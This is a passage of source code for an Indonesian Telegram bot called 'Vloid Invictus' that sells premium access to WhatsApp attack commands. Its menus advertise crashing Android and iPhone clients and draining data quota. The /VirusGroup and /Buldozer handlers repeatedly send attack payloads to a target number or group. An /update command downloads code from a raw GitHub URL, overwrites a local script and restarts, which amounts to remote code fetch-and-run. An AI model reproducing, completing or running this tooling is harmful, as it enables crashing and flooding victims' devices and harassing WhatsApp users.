    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});
const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "Please Wait for Loading ⌛",
    "Verifying Registered Tokens ✅",
    "Installing Anti-Bypass Server 🛡️",
    "Menu Display Process 📱",
    "Menu Successfully Displayed 🕊️"
  ];

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("⏳ *Please Wait for Server Loading...*", {
      parse_mode: "Markdown"
    });

    for (const frame of frames) {
      if (tokenValidated) break;
      await sleep(180);
      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `🔐 *Please Wait for Server Loading...*\n${frame}`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    if (!GITHUB_TOKEN_LIST_URL || !BOT_TOKEN) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `GITHUB_TOKEN_LIST_URL` atau `BOT_TOKEN`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Fungsi ambil data token pakai HTTPS native
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(GITHUB_TOKEN_LIST_URL, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", (err) => reject(err));
    });

    let result;
    try {
      result = await getTokenData();
    } catch (err) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = (result && Array.isArray(result.tokens)) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Validasi token
    if (tokens.includes(BOT_TOKEN)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ *Token Successfully Verified*\n Opening the Main Menu",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/Xwarrxxx" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/n9x0x6.jpg", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Terjadi kesalahan saat memverifikasi token.*",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ *Terjadi kesalahan saat memverifikasi token.*", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

// =========================
// START COMMAND & 
// =========================
bot.start(async (ctx) => {
  if (!tokenValidated)
    return ctx.reply("❌ *Token Not Verified by Server* Wait for the Process to Complete.", { parse_mode: "Markdown" });
  
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 NOTIFIKASI START PRIVATE\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = ` 
<blockquote>[🕷️] 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 ㄓ</blockquote>
(𖤍) - Ola @${ctx.from.username || "Tidak Ada"} Добро пожаловать! Вы открыли меню скриптов Type Telegraf через Telegram. 

<blockquote>(⎙) 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ㄓ</blockquote>
✗ Owner : @XerozNotDev
✗ Version : 5.0 
✗ Status Session : ${premiumStatus}
✗ Status Premium : ${senderStatus}
✗ Run Time : ${runtimeStatus}
✗ /update updyahehej

<blockquote>( ! ) 𝚂𝚎𝚕𝚎𝚌𝚝 𝚝𝚑𝚎 𝚋𝚞𝚝𝚝𝚘𝚗 𝚋𝚎𝚕𝚘𝚠</blockquote>
`;

  const keyboard = [
    [
        { text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂", callback_data: "/bug_menu" },
        { text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂", callback_data: "/bug_menu" }
    ],
    [
        { text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂", callback_data: "/bug_menu" }
    ],
    [
         { text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
        url: "t.me/XerozNotDev" }
    ]
];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Aktif" : "Tidak";
  const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<blockquote>[🕷️] 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 ㄓ</blockquote>
(𖤍) - Ola @${ctx.from.username || "Tidak Ada"} Добро пожаловать! Вы открыли меню скриптов Type Telegraf через Telegram. 

<blockquote>(⎙) 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ㄓ</blockquote>
✗ Owner : @XerozNotDev
✗ Version : 5.0 
✗ Status Session : ${premiumStatus}
✗ Status Premium : ${senderStatus}
✗ Run Time : ${runtimeStatus}
✗ /update updyahehej

<blockquote>( ! ) 𝚂𝚎𝚕𝚎𝚌𝚝 𝚝𝚑𝚎 𝚋𝚞𝚝𝚝𝚘𝚗 𝚋𝚎𝚕𝚘𝚠</blockquote>
`;

  const keyboard = [
    [
        { text: "𝗕𝘂𝗴 𝗠𝗲𝗻𝘂", callback_data: "/bug_menu" },
        { text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂", callback_data: "/bug_menu" }
    ],
    [
        { text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂", callback_data: "/bug_menu" }
    ],
    [
         { text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
        url: "t.me/XerozNotDev" }
    ]
];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug_menu', async (ctx) => {
     const senderStatus = isWhatsAppConnected ? "Aktif" : "Tidak";
    const bug_menuMenu = `
<i>📍 Page Tampilan 2/6</i>

<blockquote expandable>
<b>───────────────────</b>
☇ <b>Status Server</b> : Server Global 🌐
☇ <b>Protection</b> : Aktif 
☇ <b>Status Sender</b> : ${senderStatus}
<b>───────────────────</b>
<b>───═⬡ BUG MENU ⬡═────</b>
☇ /Flowerdly - Crash Invisible Android
☇ /Clover - Delay invisible Infinity 
☇ /Hardcore - Delay invisible hard 
☇ /XLow - Force Close Click 
☇ /BlankChat - Blank Click WhatsApp
☇ /Killerios - Crash Invisible iPhone 
☇ /Buldozer - Draining Kuota hard 
<b>───═⬡ BUG GROUP ⬡═────</b>
☇ /VirusGroup - Crash Group No Pay
📍 Example : /VirusGroup jidgroup
<b>───═⬡ CEK JIDGROUP ⬡═────</b>
☇ /cekgbid - Cekk Jid Group 
📍 Example : /cekgbid linkgb
<b>─────────────────────</b>
</blockquote>
`;

    const keyboard = [
    [
        { text: "« Back", callback_data: "/start" },
        { text: "Next »", callback_data: "/owner_acces" }
    ],
    [
        { text: "Author ☇ Script", 
        url: "t.me/XerozNotDev" }
    ]
];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/owner_acces', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const owner_accesMenu = `
<u>📍 Page Tampilan 3/6</u>

<blockquote expandable>
<b>───────────────────</b>
☇ <b>Status Server</b> : Server Global 🌐
☇ <b>Protection</b> : Aktif 
☇ <b>Run Time</b> : ${runtimeStatus}
<b>───────────────────</b>
<b>───═⬡ UPDATE SCRIPT ⬡═───</b>
☇ /block - Block Command Bug
☇ /unblock - Unblock Command Bug
☇ /listblock - Daftar Command Block
<b>───═⬡ SET LAINNYA ⬡═───</b>
☇ /addprem - Adding Prem User
☇ /delprem - Deleting Prem User 
☇ /addpremgrup - Adding Group
☇ /delpremgrup - Deleting Group
☇ /grouponly - Group Only Mode 
<b>───═⬡ SET SENDER ⬡═───</b>
☇ /addbot - Adding Your Sender
☇ /killsesi - Reset Session 
<b>───────────────────</b>
</blockquote>

`;
    const keyboard = [
    [
        { text: "« Back", callback_data: "/bug_menu" },
        { text: "Next »", callback_data: "/search_music" }
    ],
    [
        { text: "Author ☇ Script", 
        url: "t.me/XerozNotDev" }
    ]
];

    try {
        await ctx.editMessageCaption(owner_accesMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tqto menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/search_music', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const search_musicMenu = `
<u>📍 Page Tampilan 4/6</u>

<blockquote expandable>
<b>───────────────────</b>
☇ <b>Status Server</b> : Server Global 🌐
☇ <b>Protection</b> : Aktif 
☇ <b>Run Time</b> : ${runtimeStatus}
<b>───────────────────</b>
<b>───═⬡ PLAY MUSIC ⬡═───</b>
☇ /music - Search Music 30 detik
☇ /playmusic - Search Music YouTube
<b>───═⬡ PLAY GAME ⬡═───</b>
☇ /game - Mulai permainan
☇ /tebak <angka> - Tebak angka
☇ /hint - Dapatkan petunjuk
☇ /leaderboard - Lihat ranking
<b>───────────────────</b>
</blockquote>
`;

    const keyboard = [
    [
        { text: "« Back", callback_data: "/owner_acces" },
        { text: "Next »", callback_data: "/Security_gb" }
    ],
    [
        { text: "Author ☇ Script", 
        url: "t.me/XerozNotDev" }
    ]
];

    try {
        await ctx.editMessageCaption(search_musicMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/Security_gb', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const Security_gbMenu = `
<u>📍 Page Tampilan 5/6</u>

<blockquote expandable>
<b>───────────────────</b>
☇ <b>Status Server</b> : Server Global 🌐
☇ <b>Protection</b> : Aktif 
☇ <b>Run Time</b> : ${runtimeStatus}
<b>───────────────────</b>
<b>───═⬡ SECURITY GB ⬡═───</b>
☇ /lock - Tutup Chatting Group 
☇ /unlock - Buka Chatting Group
☇ /setwarn - Block Kata Terlarang 
☇ /antilink - Anti Link Group
☇ /ban - Ban User Dari Group
☇ /unban unban - User Dari Group 
☇ /mute - Mute User Dari Group 
☇ /unmute - unmute User Dari Group 
☇ /kick - Kick User Dari Group 
<b>───═⬡ SET WELCOME ⬡═───</b>
☇ /setwelcome - Welcome User Join
☇ /setgoodbye - Set Keluar User 
<b>───────────────────</b>
⛔ : Bot Wajib Perizininan Akses
Biar Semua Command Work ✅
</blockquote>
`;

    const keyboard = [
    [
        { text: "« Back", callback_data: "/search_music" },
        { text: "Next »", callback_data: "/support_menu" }
    ],
    [
        { text: "Author ☇ Script", 
        url: "t.me/XerozNotDev" }
    ]
];

    try {
        await ctx.editMessageCaption(Security_gbMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/support_menu', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const support_menuMenu = `
<u>📍 Page Tampilan 6/6</u>

<blockquote expandable>
<b>───────────────────</b>
☇ <b>Status Server</b> : Server Global 🌐
☇ <b>Protection</b> : Aktif 
☇ <b>Run Time</b> : ${runtimeStatus}
<b>───────────────────</b>
<b>───═⬡ THANKS TO ⬡═───</b>
☇ Developer - XerozNotDev 
☇ Friends - Fanzzz
☇ Support - Xatanicvxii
☇ Support - xwarrxxx
☇ Support - NarendraRajaIblis
☇ Support - Orang Tua
☇ My God - Allah SWT 
☇ Thanks All Buyyer Script 
<b>───────────────────</b>
</blockquote>
`;

    const keyboard = [
    [
        { text: "« Back", callback_data: "/start" }
    ],
    [
        { text: "Author ☇ Script", 
        url: "t.me/XerozNotDev" }
    ]
];

    try {
        await ctx.editMessageCaption(support_menuMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tqto menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});
// ================== JOB FILTER CORE ==================
let jobId = 0;
const jobQueue = [];
let jobRunning = false;

async function runJobQueue() {
  if (jobRunning) return;
  if (jobQueue.length === 0) return;

  jobRunning = true;
  const job = jobQueue.shift();

  console.log(
    `🧵 JOB #${job.id} | START | User: ${job.user}`
  );

  try {
    await job.task();
    console.log(
      `✅ JOB #${job.id} | DONE`
    );
  } catch (e) {
    console.log(
      `❌ JOB #${job.id} | ERROR`
    );
  } finally {
    jobRunning = false;
    setTimeout(runJobQueue, 500);
  }
}

function addJob(ctx, task) {
  jobId++;

  const job = {
    id: jobId,
    user: ctx.from.id,
    task
  };

  jobQueue.push(job);

  console.log(
    `📥 JOB #${job.id} | QUEUED | Posisi: ${jobQueue.length}`
  );

  ctx.reply(`⏳ Masuk antrian job (#${job.id})`);
  runJobQueue();
}
// ================== COMMAND BLOCKER CORE ==================
const blockedCommands = new Set();

// middleware cek command diblok
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();

  if (ctx.message.text.startsWith("/")) {
    const cmd = ctx.message.text.split(" ")[0].replace("/", "").toLowerCase();

    if (blockedCommands.has(cmd)) {
      return ctx.reply(`🚫 Command /${cmd} sedang diblok.`);
    }
  }

  return next();
});

//CASE BUG VLOID INVICTUS//
//AUTOPO UPDATEEEEE//
bot.command("update", async (ctx) => {

  if (ctx.from.id !== ownerID) {
    return ctx.reply("❌ Khusus owner.");
  }

  const fileUrl = "https://raw.githubusercontent.com/agungdermawan22332-sys/Vloid-Update/main/Cloverich.js";
  const filePath = "./Cloverich.js";

  await ctx.reply("⏳ Auto Update Script Mohon Tunggu...");

  const file = fs.createWriteStream(filePath);

  https.get(fileUrl, (res) => {

    if (res.statusCode !== 200) {
      return ctx.reply("❌ Gagal download file update.");
    }

    res.pipe(file);

    file.on("finish", () => {
      file.close();

      ctx.reply("✅ Update Berhasil\n📄 File ditemukan: Cloverich.js\n♻ Restarting bot...");

      setTimeout(() => {
        process.exit(0);
      }, 2000);
    });

  }).on("error", (err) => {
    console.log(err);
    ctx.reply("❌ Terjadi kesalahan saat update.");
  });

});
//------(BLOCK 1 COMMAND | ADMIN SCRIPT)-----//
bot.command("block", async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ Khusus ADMIN BOT.");
  }

  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) return ctx.reply("❌ Contoh: /block bug");

  const cleanCmd = cmd.replace("/", "").toLowerCase();

  blockedCommands.add(cleanCmd);
  ctx.reply(`✅ Command /${cleanCmd} berhasil diblok.`);
});
//------(UNBLOCK 1 COMMAND | ADMIN SCRIPT)-----//
bot.command("unblock", async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ Khusus ADMIN BOT.");
  }

  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) return ctx.reply("❌ Contoh: /unblock bug");

  const cleanCmd = cmd.replace("/", "").toLowerCase();

  if (!blockedCommands.has(cleanCmd)) {
    return ctx.reply(`⚠️ Command /${cleanCmd} tidak sedang diblok.`);
  }

  blockedCommands.delete(cleanCmd);
  ctx.reply(`✅ Command /${cleanCmd} berhasil dibuka.`);
});
//------(LIST BLOCKED COMMAND | ADMIN SCRIPT)-----//
bot.command("listblock", async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ Khusus ADMIN BOT.");
  }

  if (blockedCommands.size === 0) {
    return ctx.reply("📭 Tidak ada command yang diblok.");
  }

  const list = [...blockedCommands]
    .map((cmd, i) => `${i + 1}. /${cmd}`)
    .join("\n");

  ctx.reply(`🚫 *Daftar Command Diblok:*\n\n${list}`, {
    parse_mode: "Markdown"
  });
});

bot.use(async (ctx, next) => {
  if (!ctx.chat || ctx.chat.type === "private") return next()

  if (!ctx.message || !ctx.message.text || !ctx.message.text.startsWith("/"))
    return next()

  const chatId = ctx.chat.id
  const text = ctx.message.text.split("@")[0].toLowerCase()

  const allowWhenLocked = ["/buka", "/tutup"]

  if (commandLock.get(chatId)) {
    if (!isAdmin(ctx.from.id) && !allowWhenLocked.includes(text)) {
      return ctx.reply("🔒 Command sedang dikunci oleh admin.")
    }
  }

  return next()
})

bot.command("tutup", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return

  if (!isAdmin(ctx.from.id))
    return ctx.reply("❌ Kamu bukan admin bot.")

  commandLock.set(ctx.chat.id, true)
  ctx.reply("🔒 Command dikunci")
})

bot.command("buka", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return

  if (!isAdmin(ctx.from.id))
    return ctx.reply("❌ Kamu bukan admin bot.")

  commandLock.set(ctx.chat.id, false)
  ctx.reply("🔓 Command dibuka")
})
//-------(AMBIL ID GB ATAU CEK)--------//
bot.command("cekgbid", checkWhatsAppConnection, async (ctx) => {
  try {
    const text = ctx.message.text;
    const link = text.split(" ")[1];

    if (!link)
      return ctx.reply("🪧 ☇ Format: /cekgbid https://chat.whatsapp.com/XXXXX");

    const match = link.match(
      /chat\.whatsapp\.com\/([A-Za-z0-9_-]{10,})/
    );

    if (!match)
      return ctx.reply("❌ ☇ Link grup tidak valid");

    const inviteCode = match[1];

    if (!sock)
      return ctx.reply("❌ ☇ Socket belum siap");

    const info = await sock.groupGetInviteInfo(inviteCode);

    const groupId = info.id;
    const subject = info.subject || "-";
    const owner = info.owner || "-";
    const size = info.size || 0;

    await ctx.reply(`
    <pre><code class="language-javascript">
╭═───⊱ GROUP INFO ───═⬡
│ ⸙ Name
│ᯓ➤ ${subject}
│ ⸙ Group ID
│ᯓ➤ ${groupId}
│ ⸙ Owner
│ᯓ➤ ${owner}
│ ⸙ Members
│ᯓ➤ ${size}
╰═─────────────═⬡</code></pre>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    ctx.reply("❌ ☇ Gagal mengambil Id grup");
  }
});
//-------(CASEE BUGGGG GROUP)--------//
bot.command("VirusGroup", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /VirusGroup 12×××`);
  let target = q.replace(/[^0-9]/g, '') + "@g.us";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>
𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Crash Invisible Group
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /VirusGroup
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗕𝘂𝗴 : Sending Process

<i>⌛ Bug Group Process Begins</i>
<i>🔧 Optimizing Process Group Bugs</i>
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await R9X(sock, target, false);
    await SpamInvisgb(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>
𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Crash Invisible Group
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /VirusGroup
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗕𝘂𝗴 : Process Completed

<i>⌛ Bug Group Process Begins</i>
<i>🔧 Optimizing Process Group Bugs</i>
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
//-------(CASEE BUGGGG ANJAYY)--------//
bot.command("Buldozer",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /Buldozer 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const progressStages = [
      "▱▱▱▱▱▱▱▱ 0%",
      "▰▰▰▱▱▱▱▱ 30%",
      "▰▰▰▰▱▱▱▱ 50%",
      "▰▰▰▰▰▰▱▱ 70%",
      "▰▰▰▰▰▰▰▰ 100%"
    ];

    const sentMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Draining Kuota hard 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Buldozer
⬡ 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮 : @${ctx.from.username || "Tidak Ada"}
⬡ 𝗟𝗼𝗮𝗱𝗶𝗻𝗴 : ${progressStages[0]}

<i>⌛ Please pause for 1 - 5 minutes</i>
<i>After Waiting Please Bug Back ✅</i>
</blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🔄 Progress loading
    for (let i = 1; i < progressStages.length; i++) {
      await sleep(400);
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msgId,
        undefined,
        `<blockquote>
✘ 𝐕𝐋𝐎𝐈𝐃 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐕𝟒.𝟎 ♛

⬡ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${q}
⬡ 𝗧𝘆𝗽𝗲   : Draining Kuota hard 
⬡ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /Buldozer
